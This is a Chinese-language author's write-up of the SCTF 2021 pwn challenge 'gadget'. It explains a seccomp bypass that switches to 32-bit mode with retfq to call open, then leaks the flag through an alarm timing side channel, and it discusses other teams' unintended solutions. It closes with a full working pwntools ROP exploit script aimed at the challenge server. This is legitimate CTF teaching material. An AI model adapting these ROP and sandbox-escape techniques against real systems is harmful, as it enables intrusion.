---
title: SCTF 2021 gadget 出题与题解
date: 2021-12-31 03:39:49
permalink: /pages/a905fd/
categories:
  - ctf_wp
  - sctf
tags:
  - 
---
# SCTF2021 pwn gadget 出题思路+预期非预期解

[sctf2021 pwn出题思路](https://lingze.xyz/pages/6d05cb/)

[[toc]]



出题思路其实来自[这个题目](https://lingze.xyz/pages/ea4dff/)，非常规的gadget拼凑，

## 编译环境

这个题目的编译环境是ollvm编译出的musl libc， 然后使用这个musl去静态编译出文件来。从而得到的文件中的gadget就很少见了。

![image-20211112202707893](https://s2.loli.net/2022/01/02/m4PVCEkhUFo3jOd.png)

## ora思路

![image-20211112202551950](https://s2.loli.net/2022/01/02/RpgawNKQUcSYTs6.png)

看到沙盒应该就有对应的思路了，先使用retfq跳到32位使用open， 然后回到64位使用read， 最后通过alarm得到flag， 

这应该是shellcode题目常见的思路，

## gadget

这里相关的gadget都通过内联汇编或者赋值语句放在程序内了，用ropper查找应该会比ROPgadget效果好一些些。

```c
    // pop rcx; retn;
    int ret = 0xc359;

    // jmp $ 
    int b = 0xfeeb;

    // retfq
    int a = 0xcb48;
    // int 80; retn;
    int b = 0xc380cd;

    asm volatile(
        "movb (%rsi, %rax), %bl\n\t"
        "mov %rbx, %rdi\n\t"
        "push %r14\n\t"
        "ret\n\t"
     );
```

### 出题考点

其实个人对于gadget的理解是这样的： 

一小段代码，它的结构大概是如此: `[功能][副作用][再次控制]`， 

这个功能是我们想要让他运行的代码。

副作用即 我们运行这个gadget必定会向下运行，必须要让他满足的一些指令，或者会干扰我们利用的一些操作也要去处理掉。

再次控制可以是ret， 或者call/jmp某个寄存器，都是ok的，

于是设计题目的时候多次使用了一些很不常规的gadget， 可惜出题有些仓促也没怎么测试题目，导致一些位置没处理好，这几个重要的位置也有挺多非预期，也就直接公布这个题解大伙看看吧。

### 栈迁移

原本思路是通过leave栈迁移，

> 其实这个第一条完全可用，而且比第一条还短。🧐

![image-20211112204517189](https://s2.loli.net/2022/01/02/VAOEFwbgzYXvopI.png)

那么这里有一个长度限制，使用`pop rdi, jmp rax;`会比`pop rdi; pop rap; ret`少一个字节，

![image-20211112203428200](https://s2.loli.net/2022/01/02/aK1pwkNObcFLfsM.png)

并且在main函数返回的时候已经设置好了这个rax的值

![image-20211112203553814](https://s2.loli.net/2022/01/02/wHzkxYv2j3fnL5p.png)

看到wp很多师傅通过pop rsp进行栈迁移了，这个在出题的时候确实没有考虑到，这个方案可以更简单一些。

### mov rdx

在gadget中其实是没有可用的`pop rdx`相关的，

![image-20211112204006171](https://s2.loli.net/2022/01/02/pu7C4XxWrbVJE8g.png)

> 这个最后的 `ret 0xfdbf;`会让栈降低 0xfdbf个大小，不可控

但是有个这样的gadget路线

![image-20211112204105740](https://s2.loli.net/2022/01/02/JtPZqQO8ilGkEMj.png)

注意这个 `mov rdx, r12; call r14;`， 

![image-20211112204114078](https://s2.loli.net/2022/01/02/Oy6nKwGFizVC7R4.png)

这两个寄存器我们都可以控制，于是可以借助这个控制rdx， 

同时，由于是`call r14`， 会有返回地址压栈， 于是我们将r14设置到一个随意一个`pop ;ret`的结构即可。



但是出题仍然没处理好这个位置，主要一开始对于ollvm不太熟，会把这个位置混淆了，于是就吧参数全设置到read内了，后来用了`__attribute`但是忘了改回来，这样就提供了可以直接跳过来不控制rdx的方案，

![image-20211112210115902](https://s2.loli.net/2022/01/02/YPoigtFuK8mRfAs.png)

而且一直到放题目也没有再注意到这个点，所以这个位置其实出简单了 qaq

## 时间爆破

### alarm 

其实这个位置预期就是ora嘛，使用alarm即可，这里给了个gadget用来取出flag每一位，

![image-20211112210737186](https://s2.loli.net/2022/01/02/skQcNqREtIgf6vi.png)

但是要注意的是，这里是bl, 下面传递是rbx, 需要提前清理掉rbx中的数据，不然还是g， 

### sub [rcx], esi;

但是nebula的师傅找到了其他gadget， 太猛了！

![image-20211112210531054](https://s2.loli.net/2022/01/02/CapqI3MRF5YiHBQ.png)

> 这个gadget还是在静态编译的库函数中的，确实猛，

### libc_exit_fini

另一个思路是Dest0g3的师傅，这个位置是exit函数中进行数据比较的位置，控制rsp指向我们的flag， 然后这个取值和比较会取到我们的flag， 

![image-20211112211458215](https://s2.loli.net/2022/01/02/jCBYpAXb1FcdyGU.png)

这个位置的比较会干扰到整个程序是否退出，于是如果比较成功，那么程序会进入死循环，

![image-20220102212151438](https://s2.loli.net/2022/01/02/xNOMm47pC13qWZR.png)

### sub+jz 拼凑

r4kpig的师傅们采用了另一套方案拼凑起来sub + jz的跳转，

先运行这个位置比较两个数据，这一步会设置eflag寄存器，下面可以直接使用jz判断是否位0， 即两个数值是否相等，

![image-20220102213510620](https://s2.loli.net/2022/01/02/pvXBCw8deRPuMo5.png)

而后找到一个jz的位置， 两条路不一致，一个跳向rax, 一个直接ret, 于是控制一个为exit一个为`jmp $`(loop)即可，

![image-20220102213933015](https://s2.loli.net/2022/01/02/xid6VtSEcuKzRN5.png)



## exp

这里exp是我的思路。

```python
from pwn import * 

context.log_level='debug'
context.terminal = ['tmux', 'splitw']

cmd = '''
b * 0x0000000000401222
b * 0x0000000000408865
b * 0x00000000004011f3
'''

# pop rdi; jmp rax; 
poprdi_jmprax = 0x0000000000402be4
#  pop rdi; pop rbp; ret;
poprdi_poprbp = 0x0000000000401734

# : pop rsi; pop r15; jmp rax;
poprsi_1_jmprax = 0x0000000000402be2
# : pop rsi; pop r15; pop rbp; ret;
poprsi_2 = 0x0000000000401732

# : mov rdx, r12; call r14;
movrdx_callr14 = 0x0000000000402c07
# : pop r12; pop r14; pop r15; pop rbp; ret;
popr12_popr14_2 = 0x000000000040172f

# : pop rax; ret;
poprax = 0x0000000000401001
# : pop rbp; ret;
poprbp_ret = 0x0000000000401102
# : syscall; ret;
syscall_ret = 0x0000000000408865
# : leave; mov qword ptr [rdi + rdx - 0x2f], rax; mov qword ptr [rdi + rdx - 0x27], rax; mov rax, rdi; ret; 
leave = 0x0000000000403be5
# : leave; mov dword ptr [rbp - 0x40], eax; mov eax, ecx; add rsp, 0x40; pop rbp; ret; 
leave2 = 0x0000000000401224
# : ret; 
ret = 0x0000000000401002

# : int 0x80; ret; 
int80 = 0x00000000004011f3
# .text:retfq
retfq = 0x00000000004011EC

# 0x0000000000402cf5: pop rbx; pop r14; pop r15; pop rbp; ret; 
poprbx_popr14_2 = 0x0000000000403072

# 0x000000000040115b: pop rcx; ret;
poprcx = 0x000000000040117b

#  mov bl, [rsi+rax];mov rdi, rbx;push r14;retn; 
movrdi = 0x00000000004011BE

# : pop r14; pop r15; pop rbp; ret;
popr14_2 = 0x0000000000401731
# 000000000040119A: jmp $
loop = 0x00000000004011BA

bss = 0x00000000040D160
ptr = bss 
fake_rbp = bss
buf = fake_rbp + 0x8

alarm = 0x000000000401150

def exp(idx):
    #cn = process('./gadget')
    cn = remote("81.69.0.47",  2102)

    payload = flat(b'a' * 0x30, 0, 
            # read(0, buf, 0x200)
            poprdi_jmprax, 0, 
            poprsi_1_jmprax, ptr, 0, 
            popr12_popr14_2, 0x300, poprbp_ret, 0, 0, 
            movrdx_callr14, 
            poprax, 0, 
            syscall_ret, 
            # leave stack->fake_rbp(in bss)
            # poprdi_poprbp, ptr, fake_rbp, 
            poprbp_ret, fake_rbp, 
            leave2, 
        arch='amd64')

    stack = flat(ptr, arch='amd64')
    flag_str =  b'./test\x00'.ljust(0x40, b'\x00') 
    to32 = flat(0, 
            retfq, ret, 0x23, 
        arch='amd64') 

    rop32 =  flat(
            # open(flag, 0, 0)
            # eax=5, ebx=flag, ecx=0, edx=0, 
            poprax, 5, 
            poprbx_popr14_2, buf, 1, 2, 3, 
            poprcx, 0, 
            int80, 
            retfq, ret, 0x33, 
        arch='i386') 

    rop64 = flat(
            # read(3, flag, 0x40)
            poprdi_poprbp, 3, 0, 
            poprsi_2, buf, 0, 0, 
            popr12_popr14_2, 0x40, poprbp_ret, 0, 0, 
            movrdx_callr14, 
            poprax, 0, 
            syscall_ret, 

            # alarm([flag+idx])

            # rax = idx
            poprax, idx, 
            # rsi = flag 
            # r14 = alarm
            # rbx = 0
            poprbx_popr14_2, 0, alarm, 0, 0, 
            # [flag+idx]
            movrdi, 
            loop, 
        arch='amd64')

    rop = stack + flag_str  + to32 + rop32 + rop64

    # gdb.attach(cn, cmd)
    cn.send(payload)
    start = time.time()
    cn.sendline(rop)
    # cn.interactive()
    try:
        cn.recv()
    except:
        ...
    end = time.time()
    cn.close()
    pass_time = int(end-start)
    print(hex(pass_time))
    flag[idx] = pass_time
    print(bytes(flag))

pool = []
flag = [0]*33
for i in range(33):
    t = threading.Thread(target=exp, args=(i, ))
    pool.append(t)
    t.start()
for i in pool:
    t.join()
print(bytes(flag))
# exp(0)
```

